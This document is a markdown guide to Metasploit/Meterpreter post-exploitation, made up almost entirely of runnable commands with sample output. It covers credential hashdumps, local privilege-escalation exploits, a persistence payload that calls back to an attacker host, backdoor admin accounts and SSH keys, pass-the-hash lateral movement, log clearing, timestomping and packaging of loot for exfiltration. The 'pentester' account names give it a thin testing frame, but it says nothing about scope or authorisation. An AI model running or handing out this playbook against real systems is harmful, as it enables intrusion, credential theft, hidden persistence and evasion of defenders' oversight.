```markdown
# Comprehensive Guide: Post-Exploitation & Vulnerability Assessment with Metasploit/Meterpreter

## 1. Initial Access & Session Stabilization

After successfully compromising the target and establishing a Meterpreter session, your first steps are critical.

### Initial Commands & Verification
```bash
# Check current user privileges
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE

# If not SYSTEM/root, note this for privilege escalation
meterpreter > getprivs
Attempting to get privileges...

# Gather comprehensive system information
meterpreter > sysinfo
Computer        : SRV-WEB01
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : CORP
Logged On Users : 7
Meterpreter     : x64/windows

# Check if it's a virtual machine (useful for exploit selection)
meterpreter > run post/windows/gather/checkvm

# Background the session for further module use
meterpreter > background
[*] Backgrounding session 1...
```

### Session Stabilization & Upgrade
```bash
# If you have a basic shell, upgrade to Meterpreter
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Sending stage (200774 bytes) to 192.168.1.105
[*] Meterpreter session 2 opened (192.168.1.102:443 -> 192.168.1.105:49213)

# Migrate to a more stable process (critical for avoiding detection and session drops)
meterpreter > ps | grep -i explorer # Find a common, stable process
meterpreter > migrate 2484
[*] Migrating from 1332 to 2484...
[*] Migration completed successfully.
```

## 2. Comprehensive System Enumeration

The goal is to gather maximum information to identify misconfigurations and vulnerabilities.

### Using Metasploit Post-Exploitation Modules

#### For Windows Targets:
```bash
# 1. Automated local exploit suggestion
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 2
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 192.168.1.105 - Collecting local exploits for x64/windows...
[*] 192.168.1.105 - 38 exploit checks are being tried...
[+] 192.168.1.105 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.

# 2. Detailed system enumeration
msf6 > use post/windows/gather/enum_domain
msf6 post(windows/gather/enum_domain) > set SESSION 2
msf6 post(windows/gather/enum_domain) > run

msf6 > use post/windows/gather/enum_logged_on_users
msf6 post(windows/gather/enum_logged_on_users) > set SESSION 2
msf6 post(windows/gather/enum_logged_on_users) > run

# 3. Credential harvesting
msf6 > use post/windows/gather/credentials/sso
msf6 post(windows/gather/credentials/sso) > set SESSION 2
msf6 post(windows/gather/credentials/sso) > run

msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 2
msf6 post(windows/gather/hashdump) > run
[*] Running module against SRV-WEB01
[*] Hashes will be saved to: /root/.msf4/loot/20230920134245_default_192.168.1.105_windows.hashes_372861.txt
[*] Dumping password hashes...
[*] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

#### For Linux Targets:
```bash
# 1. Linux-specific enumeration
msf6 > use post/linux/gather/enum_configs
msf6 post(linux/gather/enum_configs) > set SESSION 2
msf6 post(linux/gather/enum_configs) > run

msf6 > use post/linux/gather/enum_system
msf6 post(linux/gather/enum_system) > set SESSION 2
msf6 post(linux/gather/enum_system) > run

# 2. Check for SSH keys
msf6 > use post/linux/gather/enum_ssh
msf6 post(linux/gather/enum_ssh) > set SESSION 2
msf6 post(linux/gather/enum_ssh) > run

# 3. Check for interesting files
msf6 > use post/linux/gather/enum_files
msf6 post(linux/gather/enum_files) > set SESSION 2
msf6 post(linux/gather/enum_files) > run
```

### Advanced Enumeration with External Tools

#### On Windows (WinPEAS):
```bash
# Upload WinPEAS
meterpreter > upload /usr/share/winpeas/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe
[*] uploading  : /usr/share/winpeas/winPEASx64.exe -> C:\Windows\Temp\winpeas.exe
[*] Uploaded 1.66 MiB of 1.66 MiB (100.0%): /usr/share/winpeas/winPEASx64.exe -> C:\Windows\Temp\winpeas.exe
[*] uploaded   : /usr/share/winpeas/winPEASx64.exe -> C:\Windows\Temp\winpeas.exe

# Execute it (run in a shell for best results)
meterpreter > shell
Process 3452 created.
Channel 3 created.
C:\Windows\Temp>winpeas.exe quiet cmd fast
```

#### On Linux (LinPEAS):
```bash
# Upload LinPEAS
meterpreter > upload /usr/share/linpeas/linpeas.sh /tmp/linpeas.sh
[*] uploading  : /usr/share/linpeas/linpeas.sh -> /tmp/linpeas.sh
[*] Uploaded 88.07 KiB of 88.07 KiB (100.0%): /usr/share/linpeas/linpeas.sh -> /tmp/linpeas.sh
[*] uploaded   : /usr/share/linpeas/linpeas.sh -> /tmp/linpeas.sh

# Make executable and run
meterpreter > shell
Process 1234 created.
Channel 1 created.
$ chmod +x /tmp/linpeas.sh
$ /tmp/linpeas.sh -a > /tmp/linpeas_report.txt
```

## 3. Privilege Escalation Techniques

### Windows Privilege Escalation

#### Using Metasploit Modules:
```bash
# 1. Try UAC bypass first (gets admin privileges)
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 exploit(windows/local/bypassuac_eventvwr) > set SESSION 2
msf6 exploit(windows/local/bypassuac_eventvwr) > run
[*] Exploit completed, but no session was created.

# 2. Try named pipe impersonation
msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 2
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 192.168.1.102:4444 
[*] Writing payload file to C:\Windows\TEMP\radBEOHv.ps1...
[*] Compressing script contents...
[+] Compressed size: 3592
[*] Executing exploit script...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200774 bytes) to 192.168.1.105
[*] Meterpreter session 3 opened (192.168.1.102:4444 -> 192.168.1.105:49214)

# 3. Check if we got SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Manual Techniques (When Automated Fails):
```bash
# Check for AlwaysInstallElevated vulnerability
meterpreter > reg queryval -k HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -v AlwaysInstallElevated
meterpreter > reg queryval -k HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -v AlwaysInstallElevated

# Check for unquoted service paths
meterpreter > run post/windows/gather/enum_services

# Check for vulnerable drivers
meterpreter > run post/windows/gather/enum_drivers
```

### Linux Privilege Escalation

#### Using Metasploit Modules:
```bash
# 1. Try popular kernel exploits
msf6 > use exploit/linux/local/dirty_cow
msf6 exploit(linux/local/dirty_cow) > set SESSION 2
msf6 exploit(linux/local/dirty_cow) > run

# 2. Try Sudo privilege escalation
msf6 > use exploit/linux/local/sudo_baron_samedit
msf6 exploit(linux/local/sudo_baron_samedit) > set SESSION 2
msf6 exploit(linux/local/sudo_baron_samedit) > run

# 3. Try Docker escape if in container
msf6 > use exploit/linux/local/docker_daemon_privilege_escalation
msf6 exploit(linux/local/docker_daemon_privilege_escalation) > set SESSION 2
msf6 exploit(linux/local/docker_daemon_privilege_escalation) > run
```

#### Manual Techniques:
```bash
# Check for SUID/SGID files
meterpreter > shell
$ find / -perm -4000 -type f 2>/dev/null
$ find / -perm -2000 -type f 2>/dev/null

# Check for capabilities
$ getcap -r / 2>/dev/null

# Check for cron jobs
$ ls -la /etc/cron* /var/spool/cron/

# Check for world-writable files
$ find / -perm -2 -type f 2>/dev/null | grep -v "/proc/"
```

## 4. Persistence & Maintaining Access

### Creating Backdoors:
```bash
# Meterpreter persistence module
meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.102
[*] Running Persistence Script
[*] Resource file for cleanup created: /root/.msf4/logs/persistence/SRV-WEB01_20230920.1342/SRV-WEB01_20230920.1342.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=443
[*] Persistent agent script is 996512 bytes long
[+] Persistent Script written to C:\Windows\TEMP\qjH.exe
[*] Executing script C:\Windows\TEMP\qjH.exe
[+] Agent executed with PID 4567
```

### Creating Alternate Users:
```bash
# On Windows
meterpreter > shell
C:\> net user pentester P@ssw0rd123! /add
C:\> net localgroup administrators pentester /add

# On Linux
meterpreter > shell
$ useradd -m -s /bin/bash pentester
$ echo "pentester:P@ssw0rd123!" | chpasswd
$ usermod -aG sudo pentester
```

### Installing SSH Backdoors:
```bash
# On Linux
meterpreter > shell
$ echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
$ echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /home/pentester/.ssh/authorized_keys

# On Windows (with OpenSSH installed)
C:\> echo ssh-rsa AAAAB3NzaC1yc2E... >> C:\ProgramData\ssh\administrators_authorized_keys
```

## 5. Lateral Movement & Domain Exploration

### Password Spraying & Hash Passing:
```bash
# Use harvested hashes for lateral movement
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.110
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > run
```

### Network Discovery:
```bash
# Port scan from the compromised host
meterpreter > run post/multi/gather/tcpudp_scanner RHOSTS=192.168.1.0/24 PORTS=22,80,135,139,443,445,3389

# ARP scan for live hosts
meterpreter > run post/multi/gather/arp_scanner RHOSTS=192.168.1.0/24
```

## 6. Covering Tracks & OPSEC

### Clearing Logs:
```bash
# On Windows
meterpreter > run event_manager -c
[*] Clear event logs

# On Linux
meterpreter > shell
$ echo "" > /var/log/auth.log
$ echo "" > /var/log/syslog
$ history -c
```

### Timestomping:
```bash
# Modify file timestamps to blend in
meterpreter > timestomp C:\Windows\Temp\winpeas.exe -f "01/01/2020 12:00:00"
```

## 7. Exfiltration & Data Extraction

### Searching for Sensitive Data:
```bash
# Find documents, databases, config files
meterpreter > search -f *.docx *.pdf *.xlsx *.db *.config *.ini -d C:\\

# On Linux
meterpreter > search -f *.txt *.conf *.cnf *.yml *.yaml *.json -d /
```

### Data Exfiltration:
```bash
# Download interesting files
meterpreter > download C:\\Users\\Administrator\\Documents\\secret.docx /root/loot/

# Package and exfiltrate data
meterpreter > shell
C:\> tar -czf loot.tar.gz C:\ sensitive\ files\
C:\> certutil -encode loot.tar.gz loot.b64
```

## Summary Workflow

1.  **Stabilize** → Upgrade shell, migrate process, establish reliable access
2.  **Enumerate** → Use Metasploit modules + external tools (WinPEAS/LinPEAS)
3.  **Escalate** → Try automated suggester, then manual techniques
4.  **Pivot** → Explore network, move laterally with harvested credentials
5.  **Persist** → Install multiple backdoors, create alternative access
6.  **Exfiltrate** → Collect and extract valuable data
7.  **Cover** → Clear logs, blend activities into normal operations
